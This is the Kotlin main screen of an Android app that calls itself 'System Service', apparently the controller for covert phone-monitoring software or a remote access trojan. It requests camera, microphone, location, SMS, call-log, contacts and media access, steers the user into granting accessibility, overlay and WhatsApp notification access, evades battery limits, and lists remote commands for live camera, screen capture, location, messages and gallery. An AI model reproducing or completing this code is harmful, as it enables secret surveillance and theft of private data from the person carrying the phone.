package com.coc338781.childapp

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val PERMS = mutableListOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CONTACTS
    ).apply {
        if (Build.VERSION.SDK_INT >= 33) {
            add(Manifest.permission.POST_NOTIFICATIONS)
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }.toTypedArray()

    private lateinit var statusText: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val layout = LinearLayout(this)
        layout.orientation = LinearLayout.VERTICAL
        layout.setPadding(50, 100, 50, 50)

        val title = TextView(this)
        title.text = "System Service"
        title.textSize = 24f
        layout.addView(title)

        statusText = TextView(this)
        statusText.text = "\n\nStatus: Ready\n\n1. Start Monitoring\n2. Allow permissions\n3. Accessibility → ON\n4. Overlay → Allow\n5. Notification → ON"
        statusText.textSize = 14f
        layout.addView(statusText)

        val startBtn = Button(this)
        startBtn.text = "Start Monitoring"
        layout.addView(startBtn)

        val accBtn = Button(this)
        accBtn.text = "Accessibility Settings"
        layout.addView(accBtn)

        val overlayBtn = Button(this)
        overlayBtn.text = "Overlay Settings"
        layout.addView(overlayBtn)

        val notifBtn = Button(this)
        notifBtn.text = "Notification Access (WhatsApp)"
        layout.addView(notifBtn)

        startBtn.setOnClickListener {
            if (hasAll()) startServiceNow()
            else ActivityCompat.requestPermissions(this, PERMS, 100)
        }
        accBtn.setOnClickListener {
            try { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) } catch (_: Exception) {}
        }
        overlayBtn.setOnClickListener {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
        }
        notifBtn.setOnClickListener {
            try {
                startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
            } catch (_: Exception) {}
        }

        setContentView(layout)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this))
                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName")))
                } catch (_: Exception) {}
            }
        }
    }

    private fun hasAll(): Boolean {
        for (p in PERMS)
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) return false
        return true
    }

    private fun startServiceNow() {
        try {
            val i = Intent(this, MonitoringService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i)
            else startService(i)
            statusText.text = "\n\n✅ Monitoring Started!\n\nCommands:\n/cam /selfie\n/livecam /liveselfie\n/stop\n/screen /livescreen\n/location /battery\n/sms /calls /gallery\n/flash /vibrate /toast\n/ping"
            Toast.makeText(this, "Started", Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            statusText.text = "\n\n❌ ${e.message}"
        }
    }

    override fun onRequestPermissionsResult(r: Int, p: Array<out String>, g: IntArray) {
        super.onRequestPermissionsResult(r, p, g)
        if (hasAll()) Toast.makeText(this, "Tap Start again", Toast.LENGTH_LONG).show()
    }
}
